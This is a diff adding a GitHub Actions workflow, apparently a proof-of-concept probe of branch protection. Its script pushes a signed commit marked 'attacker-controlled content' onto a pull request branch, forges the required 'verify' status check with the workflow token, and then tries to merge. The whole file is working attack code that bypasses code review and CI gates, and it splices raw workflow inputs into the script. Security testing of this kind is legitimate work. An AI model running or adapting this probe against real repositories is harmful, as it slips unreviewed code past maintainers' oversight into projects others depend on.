@@ -1,0 +1,68 @@
+name: Probe
+
+on:
+  workflow_dispatch:
+    inputs:
+      pr:
+        required: true
+        type: string
+      branch:
+        required: true
+        type: string
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe approval persistence, status forging and merge
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            const pr = Number('${{ inputs.pr }}');
+            const branch = '${{ inputs.branch }}';
+            const {owner, repo} = context.repo;
+            const q = `query($o:String!,$r:String!,$n:Int!){repository(owner:$o,name:$r){pullRequest(number:$n){
+              reviewDecision mergeable mergeStateStatus headRefOid }}}`;
+            const look = async (label) => {
+              const d = await github.graphql(q, {o: owner, r: repo, n: pr});
+              const p = d.repository.pullRequest;
+              core.info(`${label} reviewDecision=${p.reviewDecision} mergeable=${p.mergeable} state=${p.mergeStateStatus} head=${p.headRefOid}`);
+              return p;
+            };
+
+            const before = await look('BEFORE');
+
+            // 1. Create a commit through the API. GitHub signs these.
+            const br = await github.graphql(`query($o:String!,$r:String!,$b:String!){repository(owner:$o,name:$r){
+              ref(qualifiedName:$b){target{oid}}}}`, {o: owner, r: repo, b: `refs/heads/${branch}`});
+            const oid = br.repository.ref.target.oid;
+            const made = await github.graphql(`mutation($in:CreateCommitOnBranchInput!){createCommitOnBranch(input:$in){commit{oid}}}`, {
+              in: {
+                branch: {repositoryNameWithOwner: `${owner}/${repo}`, branchName: branch},
+                expectedHeadOid: oid,
+                message: {headline: 'attacker-controlled content'},
+                fileChanges: {additions: [{path: 'PAYLOAD', contents: Buffer.from('owned\n').toString('base64')}]},
+              },
+            });
+            const newSha = made.createCommitOnBranch.commit.oid;
+            core.info(`CREATED ${newSha}`);
+            const v = await github.rest.repos.getCommit({owner, repo, ref: newSha});
+            core.info(`SIGNATURE verified=${v.data.commit.verification.verified} reason=${v.data.commit.verification.reason} committer=${v.data.commit.committer.name}`);
+
+            const after = await look('AFTER-PUSH');
+
+            // 2. Satisfy the required status check from this token.
+            try {
+              await github.rest.repos.createCommitStatus({owner, repo, sha: newSha, state: 'success',
+                context: 'verify', description: 'posted by the workflow token'});
+              core.info('STATUS created ok');
+            } catch (e) { core.info(`STATUS failed ${e.status} ${e.message}`); }
+
+            const ready = await look('AFTER-STATUS');
+
+            // 3. Attempt the merge.
+            try {
+              const m = await github.rest.pulls.merge({owner, repo, pull_number: pr, merge_method: 'squash'});
+              core.info(`MERGE ok merged=${m.data.merged} sha=${m.data.sha}`);
+            } catch (e) { core.info(`MERGE failed ${e.status} ${e.message}`); }
